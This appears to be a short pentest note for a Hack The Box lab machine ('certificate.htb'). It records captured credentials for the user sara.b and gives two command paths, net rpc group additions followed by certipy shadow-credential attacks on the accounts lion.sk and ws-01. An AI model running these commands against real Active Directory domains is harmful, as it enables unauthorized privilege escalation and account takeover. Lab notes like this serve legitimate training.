---
title: sara.b
type: user
---

### sara.b

#### validated credentials

```yaml credentials
- login: certificate.htb
  user: sara.b
  password: Blink182
  nt_hash: fffffffffffffffffffffffffffffffffff
```

PATH1 


verify: `net rpc group members "CERT PUBLISHERS" -U "$DOMAIN"/"$USER_sara_b"%"$PASS_sara_b" -S "$DC_HOST"`

```sh
net rpc group addmem "CERT PUBLISHERS" "$USER_sara_b" -U "$DOMAIN"/"$USER_sara_b"%"$PASS_sara_b" -S "$DC_HOST"

certipy shadow auto -username "$USER_sara_b"@"$DOMAIN" -p "$PASS_sara_b" -account lion.sk
```

dump wireshark also can get hash and password

[[lion.sk]]

same for ryan.k

[[ryan.k]]

PATH2 

```sh
net rpc group addmem 'Enterprise Read-Only Domain Controllers' "$USER_sara_b" -U "$DOMAIN"/"$USER_sara_b"%"$PASS_sara_b" -S "$DC_HOST"

certipy shadow auto -username "$USER_sara_b"@"$DOMAIN" -p "$PASS_sara_b" -account ws-01
```

[[ws-01]]


#### information

1. 
2. 
3. 

#### Privileges / roles / groups 






